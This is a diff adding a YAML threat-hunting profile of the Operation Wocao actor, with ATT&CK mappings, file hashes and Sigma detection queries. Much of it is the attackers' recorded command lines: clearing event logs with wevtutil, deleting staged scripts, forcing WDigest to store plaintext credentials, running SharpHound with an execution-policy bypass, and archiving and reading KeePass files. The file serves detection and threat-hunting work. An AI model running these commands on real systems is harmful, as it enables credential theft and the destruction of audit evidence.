+          embedFilename: WinRAR.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'zoo.exe a zoo.a -r G:\\Keepass\\'
+      att&ck:
+        collection:
+        - "T1560.001 - Archive Collected Data: Archive via Utility"
+  - sighting: Defense Evasion - Threat Actors care to delete actions made in the system
+    id: 587164b2-37e0-413d-802b-833ca395587a
+    behaviors:
+    - behavior: Threat actors are very consistent in removing its files from system once they have served its purpose. Some files are removed.
+      type: Process Created
+      id: bee12129-769c-4c4e-979f-be49a048ac7a
+      weapon: doscmd/del
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'del \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1'
+      att&ck:
+        defenseEvasion:
+        - "T1070.004 - Indicator Removal: File Deletion"
+    - behavior: Threat actors delete system and security event logs
+      type: Process Created
+      id: abff89b2-e89c-4053-8922-7d891ac93d13
+      weapon: wevtutil.exe
+      processes:
+        - process: C:\\Windows\\System32\\wevtutil.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'wevtutil cl system'
+        - process: C:\\Windows\\System32\\wevtutil.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'wevtutil cl security'
+      att&ck:
+        defenseEvasion:
+        - "T1070.001 - Indicator Removal: Clear Windows Event Logs"
+    - behavior: Threat Actor cleans up running backdoors from systems that are no longer of use. First search for the PID
+      type: Process Created
+      id: 2cfba6ff-33b1-441b-97b9-b8f16b0ff9a6
+      weapon: netstat.exe
+      processes:
+        - process: C:\\Windows\\System32\\netstat.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'netstat -ano|find "25667"'
+      att&ck:
+        discovery:
+        - "T1049 - System Network Connections Discovery"
+    - behavior: Once threat actors have the PID of the backdoor that they want to stop, they use taskkill to stop it
+      type: Process Created
+      id: 3e939c16-147a-4722-8513-a75dce64360d
+      weapon: taskkill.exe
+      processes:
+        - process: C:\\Windows\\System32\\taskkill.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'taskkill /f /im 4804'
+      att&ck:
+        defenseEvasion:
+        - "T1562.001 - Impair Defenses: Disable or Modify Tools"
+    - behavior: Threat actors modify the WDigest registry value from 0 to 1 to store the plain-text password of the logged in Windows domain user in memory
+      type: RegValue Modified
+      id: 67210137-5d57-4dcd-9394-08ff218f0bb4
+      weapon: reg.exe
+      registries:
+        - keyName: HKLM\\SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest
+          keyValueName: UseLogonCredential
+          keyValue: "1"
+          keyValueType: REG_DWORD
+      notes:
+      - More info here https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext
+      att&ck:
+        defenseEvasion:
+        - "T1112 - Modify Registry"
+  - sighting: Discovery - Threat Actors obtains different information that they can use after for multiple purposes
+    id: 28a65311-3a46-44a8-85b0-cf512b07044a
+    behaviors:
+    - behavior: Threat actor use SharpHound to ingest the data from BloodHound
+      type: Process Created
+      id: 77bc223e-ba09-40f6-8f83-ab14669eda16
+      weapon: SharpHound
+      processes:
+        - process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+          cmdLine:
+          - 'powershell -ep bypass -c \"& {Import-Module c:\\sh.ps1; InvokeBloodHound -CollectionMethod All}\" 1>c:\\ret.txt'
+        - process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+          cmdLine:
+          - 'powershell -ep bypass -c \"& {Import-Module c:\\windows\\temp\\sh.ps1; Invoke-BloodHound -CollectionMethod All -SearchForest}\" 1>C:\\windows\\temp\\ret.txt'
+      att&ck:
+        discovery:
+        - "T1482 - Domain Trust Discovery"
+    - behavior: Threat actors tries to get information from the KeePass configuration file
+      type: Process Created
+      id: 6e0aece9-4abe-47e0-aa86-449baa0dcadb
+      weapon: doscmd/type
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'type C:\\users\\#{username}\\appdata\\Roaming\\keepass\\KeePass.config.xml'
+      att&ck:
+        credentialAccess:
+        - "T1552.001 - Unsecured Credentials: Credentials In Files"
+    - behavior: Another interest of the threat actors is get all the files under some path related to keepass
+      type: Process Created
+      id: 289ca34b-3bc1-49e0-9077-074e17f64a4e
+      weapon: doscmd/dir
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'dir *.kdbx'
+      att&ck:
+        discovery:
+        - "T1083 - File and Directory Discovery"
+    - behavior: A custom find/walk tool used by the threat actors tries to list recursive paths and save it into a file
+      type: Process Created
+      id: 741af5dc-4cd7-47d3-9d9a-1db068e08cda
+      weapon: zos.exe
+      processes:
+        - process: C:\\Windows\\Temp\\zos.exe
+          cmdLine:
+          - 'C:\\Windows\\Temp\\zos.exe c:\ 0 c:\\windows\\temp\\zos.a'
+      att&ck:
+        discovery:
+        - "T1083 - File and Directory Discovery"
+    - behavior: A file is created with the result of the find/walk custom tool
+      type: File Created
+      id: 0177d770-d644-45cc-9897-7af2bfebae9b
+      weapon: zos.exe
+      files:
+        - path: c:\\windows\\temp\\zos.a
+          name: zos.a
+    - behavior: A public tool called nbtscan renamed is used to scan for NETBIOS nameservers
+      type: Process Created
+      id: 69237336-062d-4191-831b-f2c6ea341236
+      weapon: ntbscan
+      processes:
+        - process: C:\\Windows\\Temp\\nb.exe
+          cmdLine:
+          - 'nb.exe 10.10.0.0/16 >>10.txt'
+      notes:
+      - More info about ntbscan https://www.kali.org/tools/nbtscan/
+      att&ck:
+        discovery:
+        - "T1018 - Remote System Discovery"
+    - behavior: A file is created with the result of ntbscan
+      type: File Created
+      id: e915e185-73cf-449b-9716-d23bc495dcde
+      weapon: ntbscan
+      files:
+        - path: c:\\windows\\temp\\10.txt
+          name: 10.txt
+    - behavior: Threat Actors also uses a custom scanning tool that is capable of enumerating sessions and users on remote hosts
+      type: Process Created
+      id: 60ef67d1-19d7-40d4-aa58-168d964bc170
+      weapon: iie.exe
+      processes:
+        - process: C:\\Windows\\Temp\\iie.exe
+          cmdLine:
+          - 'C:\\Windows\\Temp\\iie.exe iie.txt -u <domain>\<username> -p "<password>" -session -s iie.log'
+      notes:
+      - More info about ntbscan https://www.kali.org/tools/nbtscan/
+      att&ck:
+        discovery:
+        - "T1033 - System Owner/User Discovery"
+    - behavior: A file is created with the result of the custom tool for enumerating sessions and users on remote hosts
+      type: File Created
+      id: 09d49fb4-adbb-435b-8357-b110464a3d25
+      weapon: iie.exe
+      files:
+        - path: c:\\windows\\temp\\iie.log
+          name: iie.log
+    - behavior: Threat Actors use dnsquery on a domain controller to retrieve all subnets in the AD
+      type: Process Created
+      id: 31e3799f-0d37-4fc9-af52-6a6961ee8b3f
+      weapon: dnsquery
+      processes:
+        - process: C:\\Windows\\Temp\\iie.exe
+          cmdLine:
+          - 'dsquery subnet'
+      att&ck:
+        discovery:
+        - "T1016 - System Network Configuration Discovery"
+    - behavior: Threat Actors attempts to identify file shares and other remote systems
+      type: Process Created
+      id: 1ed3fc23-093b-40b1-8ee5-e0ef13776641
+      weapon: netstat.exe
+      processes:
+        - process: C:\\Windows\\System32\\netstat.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'netstat -ano|find ":445"'
+      att&ck:
+        discovery:
+        - "T1135 - Network Share Discovery"
+    - behavior: Threat Actors attempts to identify which administrator to target
+      type: Process Created
+      id: a0d9c4d5-dad2-4647-98d6-6e58a805acd2
+      weapon: net.exe
+      processes:
+        - process: C:\\Windows\\System32\\net.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'net localgroup administrators'
+      att&ck:
+        discovery:
+        - "T1069.001 - Permission Groups Discovery: Local Groups"
+    - behavior: Threat Actors tries to identify specific processes using tasklist and find command
+      type: Process Created
+      id: 596a2576-0d48-4b84-8509-fdae1c5386fe
+      weapon: tasklist.exe
+      processes:
+        - process: C:\\Windows\\System32\\tasklist.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'tasklist /v |find /I "keepass"'
+          - 'tasklist /v |find "explorer.exe"'
+          - 'tasklist /svc|find "aia.exe"'
+      notes:
+      - aia.exe is one of the backdoors of threat actors
+      att&ck:
+        discovery:
+        - "T1057 - Process Discovery"
+    - behavior: Threat Actors use reg.exe to query the registry 
+      type: Process Created
+      id: 11285a6e-74fb-4a52-8782-04c2b8340496
+      weapon: reg.exe
+      processes:
+        - process: C:\\Windows\\System32\\reg.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'reg query HKEY_CURRENT_USER\\Software\\#{username}\\PuTTY\\Sessions\\'
+      att&ck:
+        discovery:
+        - "T1012 - Query Registry"
+    - behavior: Threat actors queries the registry to identify recent PuTTy sessions
+      type: RegValue Read
+      id: a2069538-0447-4940-a6ab-f43af2ef85b9
+      weapon: reg.exe
+      registries:
+        - keyName: HKEY_CURRENT_USER\\Software\\#{username}\\PuTTY\\Sessions\\
+      notes:
+      - More info here https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext
+      att&ck:
+        discovery:
+        - "T1012 - Query Registry"
+    - behavior: Threat Actor often checks for the availability of systems using the ping command
+      type: Process Created
+      id: 405482fe-16e2-4554-8ab2-102362abd733
+      weapon: ping.exe
+      processes:
+        - process: C:\\Windows\\System32\\ping.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'ping <internal IP address> -n 1'
+      att&ck:
+        discovery:
+        - "T1018 - Remote System Discovery"
+    - behavior: After the use of ping, there are network telemetry to other devices
+      id: 5d993e52-b315-49b3-bd3d-3b31030c615f
+      type: Network Accessed
+      weapon: ping.exe
+      connections:
+        - protocol: icmp
+          direction: outbound
+          dstIp: "#{internal-ip-address}"
+          process: C:\\Windows\\System32\\ping.exe
+      att&ck:
+        discovery:
+        - "T1018 - Remote System Discovery"
+    - behavior: To get a list of all users that have authenticated with a specific domain and have a user profile, the actor executes the following command on a domain controller
+      type: Process Created
+      id: 0408de4a-6d91-4f5c-9193-bb0b6a328be3
+      weapon: doscmd/dir
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine: 
+          - 'dir c:\\users\\'
+      att&ck:
+        discovery:
+        - "T1087.002 - Account Discovery: Domain Account"
+    - behavior: Threat Actor tries to get information from processes related to security vendors to stop it. In this case, Carbon Black was installed
+      type: Process Created
+      id: ff1bb861-a489-41a2-ac45-2d93e3362792
+      weapon: tasklist.exe
+      processes:
+        - process: C:\\Windows\\System32\\tasklist.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'tasklist /v|find "cb.exe"'
+      att&ck:
+        discovery:
+        - "T1057 - Process Discovery"
+    - behavior: Once discovered the security solution installed, it tries to get information from the path where it was installed
+      type: Process Created
+      id: cb93db3f-8afc-4351-9d6c-f8c9ebabf41d
+      weapon: doscmd/dir
+      processes:
+        - process: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'dir c:\windows\CarbonBlack\cb.exe'
+      att&ck:
+        discovery:
+        - "T1083 - File and Directory Discovery"
+    - behavior: Under compromised systems, threat actors retrieve basic network configuration
+      type: Process Created
+      id: 4dfb40e5-a14b-40be-9c37-54e75abe35aa
+      weapon: ipconfig.exe
+      processes:
+        - process: C:\\Windows\\System32\\ipconfig.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'ipconfig /all'
+      att&ck:
+        discovery:
+        - "T1016 - System Network Configuration Discovery"
+    - behavior: Threat Actors executes a netstat process using find command to identify specific ports of interest
+      type: Process Created
+      id: 0bcc7460-eef0-4113-8619-0dcc0d1e09f9
+      weapon: netstat.exe
+      processes:
+        - process: C:\\Windows\\System32\\netstat.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'netstat -ano|find ":3389"'
+          - 'netstat -ano|find ":445"'
+          - 'netstat -ano|find ":3389"'
+      att&ck:
+        discovery:
+        - "T1049 - System Network Connections Discovery"
+    - behavior: Threat Actors executes dnscmd.exe to get records in a zone
+      type: Process Created
+      id: 69f60859-d149-4aed-a2b2-aa8f5f71c821
+      weapon: dnscmd.exe
+      processes:
+        - process: C:\\Windows\\System32\\dnscmd.exe
+          parentProcess: C:\\Windows\\System32\\cmd.exe
+          cmdLine:
+          - 'dnscmd.exe /ZonePrint #{zone-name}'
+      att&ck:
+        discovery:
+        - "T1016 - System Network Configuration Discovery"
+iocs:
+    - behaviorIds:
+      - c35d89bb-3883-4e32-ad28-147b604e2475
+      indicators:
+      - sha256: a34a7430936ce37e78b995c321ff626933c364c50f1e7689aa1b0660432b4618
+      - sha256: fdc94d0dedf6e53dd435d2b5eacb4c34923fadee50529db6f3de38c71f325e05
+    - behaviorIds:
+      - fafb5cba-f6de-4d8f-ab55-5226a3fde9a3
+      indicators:
+      - sha256: 08f87f8c64a4c98b0e99592a436d601249feeaec4a2c4effbf69a166e4f592a0
+    - behaviorIds:
+      - 2409f33b-9b22-4c84-88a2-3229612538fa
+      indicators:
+      - sha256: 2047e464627e36410b3458e23062f23eecbd383e7854b55b497ec8db017c0d5e
+    - behaviorIds:
+      - d1df31ba-a33b-4dcf-b9ba-a6675cd207e3
+      indicators:
+      - sha256: d43251480775f224517f484686bc7ca39e532d900b86ebf6ed37da8ee13534a4
+    - behaviorIds:
+      - e9de7e83-e954-4d35-80f1-71ad4512edab
+      indicators:
+      - sha256: 6972ba198ed0d30de9f66be5777ecdba2d657078f138325ee6db225c20b29e6e
+    - behaviorIds:
+      - d8afa4b4-551c-432e-8ba2-1ded116821fe
+      indicators:
+      - sha256: 5cf61c0b865fd2ab897c72ff2cc01ac4c31ea9c50ecc3d47693f3482fd8f91d4
+      - sha256: b2162d4cbeee907d1af13918900e6e4f13232d00915563d841aa7c904d94589c
+    - behaviorIds:
+      - 953016c3-bdce-42b9-8dcd-35f42bc3826a
+      indicators:
+      - sha256: c109ddd4f43bc38a50b07b4fc22fe568cced4fb4d8c5bd71546407c2c6219048      
+    - behaviorIds:
+      - b530b98f-08c7-4def-9f91-961ee32aa673
+      indicators:
+      - sha256: 3016ea94e3c5bd7f9d8e503b1817491bcf9e2ee5bb82fc106aa5d692dd0ff5c6      
+    - behaviorIds:
+      - 8dc59e0f-5b36-4a78-a177-b8d42b79bcbd
+      indicators:
+      - sha256: 75ac4478c1729d1b5434724cf0c2bd53cc5940d251a4ca07b17c239c8f62da8d    
+    - behaviorIds:
+      - 2353d617-ed42-4018-b85c-d9f8bb142e3c
+      indicators:
+      - sha256: 5d01150ade4b302b9fd765fd0fb70aa17ee9cb9fcb219c2d270fd90ad8d01188
+    - behaviorIds:
+      - 6ae35d4e-5da6-499e-bb86-89e22aa4f443
+      indicators:
+      - sha256: a4a448d40aa8b4ff1d18de7a84b7fbc4c41c00062a56cd7c74ac443b61438f47
+threatHunting:
+  - query: Hunt for jsp file creation in paths related to JexBoss
+    queryId: 8299d6ab-408a-4baa-be6c-bd747c9d3960
+    type: sigma
+    behaviorIds:
+    - c35d89bb-3883-4e32-ad28-147b604e2475
+    logsource:
+        product: windows
+        category: file_event
+    detection:
+        selection_file:
+            TargetFilename|endswith: '.jsp'
+        selection_path:
+            TargetFilename|contains:
+                - '\jexws4\'
+                - '\jexinv4\'
+        condition: selection_file and selection_path
+  - query: Hunt for script files created in Temp folder by threat actors in Operation Wocao
+    queryId: 25851074-3b8e-4155-aae9-39efa276305f
+    type: sigma
+    behaviorIds:
+    - d1df31ba-a33b-4dcf-b9ba-a6675cd207e3
+    - e9de7e83-e954-4d35-80f1-71ad4512edab
+    logsource:
+        product: windows
+        category: file_event
+    detection:
+        selection_path:
+            TargetFilename|contains|all:
+                - '\Windows\'
+                - '\Temp\'
+        selection_file:
+            TargetFilename|endswith: 
+                 - '.vbs'
+                 - '.ps1'
+        condition: selection_path and selection_file
+  - query: Hunt for checkadmin.exe execution and schtasks execution to create a task with ps1 execution
+    queryId: 1cfac73c-be78-4f9a-9b08-5bde0c3953ab 
+    type: sigma
+    behaviorIds:
+    - 3083ddec-d653-42e3-90cc-f455ca754d68
+    - 2353d617-ed42-4018-b85c-d9f8bb142e3c
+    - 1c8d5839-fcde-4197-ab89-ead9189b7fdb
+  - query: Hunt for cscript execution of visual basic script with a txt file parameter
+    queryId: e1a5d662-a4f6-4b42-bfe0-3bfe34dc8c76
+    type: sigma
+    behaviorIds:
+    - 48c7b86e-b0d7-414c-81b3-21c1797417ad
+    logsource:
+        category: process_creation
+        product: windows
+    detection:
+        selection_cmd:
+            CommandLine|endswith: '.txt'
+            CommandLine|contains: '.vbs'
+        selection_image:
+            - Image|endswith: '\cscript.exe'
+            - OriginalFileName: 'cscript.exe'
+        condition: selection_cmd and selection_image
+  - query: Hunt for wevtutil execution for clear eventlog
+    queryId: cc36992a-4671-4f21-a91d-6c2b72a2edf5
+    type: sigma
+    behaviorIds:
+    - abff89b2-e89c-4053-8922-7d891ac93d13
+footer:
+  changeTracking:
+    created: 2022-11-16
+    lastModified: 2022-11-28
+    sightingVersion: 1.0
+    schemaVersion: 1.7
+  references:
+  - https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf
